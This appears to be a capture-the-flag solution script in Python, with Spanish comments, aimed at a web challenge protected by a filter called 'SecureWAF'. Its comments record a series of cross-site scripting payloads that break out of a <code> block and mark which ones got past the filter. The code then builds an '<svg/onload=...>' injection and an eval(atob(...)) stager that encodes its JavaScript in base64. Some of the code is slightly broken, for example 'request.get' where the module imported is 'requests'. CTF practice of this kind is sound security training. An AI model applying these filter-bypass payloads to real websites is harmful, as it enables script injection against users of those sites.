#/usr/bin/env python

import requests
import base64

url = "http://challenge.acictf.com:28976/"

#STEPS
# En el buscador, buscando <img src="#"> se triggerea
# el firewall SecureWAF
#<h1>anything</h1> NO pero renderea en la web
#En el html está dentro de un bloque:
#
#
# <p>SecureWAF detected that URL parameter
# <code><h1>anything</h1></code>contains
# dangerous data, and so this request has
# been blocked for your protection.</hp>
#
#
# Cortamos el bloque code y así escapamos
#</code><img src="#" onerror="javascript:alert(1+1)"> NO
#</code> <svg/onload=alert(1+2)> <"algo"> NO
#</code><script>alert(1+2)</script><code> NO
#</code><script>alert(1+2)</script> NO
#</code> <svg/onload=alert('XSS')> <code> NO
#</code> <svg/onload=alert(1+2)> <code> SI!

def forma1():
	xss_payload = """</code> <svg/onload=alert(1+2)> <code>"""
	params ={
		
		xss_payload : "<img"
	}

	#La url que produce es challenge.acictf.com:28976/?<2%Fcode>+<svg%2Fonload%3Dalert(1%2B2)>+<code>=<img>

	r = request.get(url,params = params)

	print(r.text)
	print(r.url)

def forma2():
	payload = """
	alert("hello hello ola")
	"""

	xss_payload = base64.b64encode(payload)
	# </code> <svg/onload=eval(atob(/%s/))><code>" NO peeero
	stager = """</code> <svg/onload=eval(atob(`%s`))><code>""" % xss_payload

	params ={
		
		xss_payload : "<img"
	}
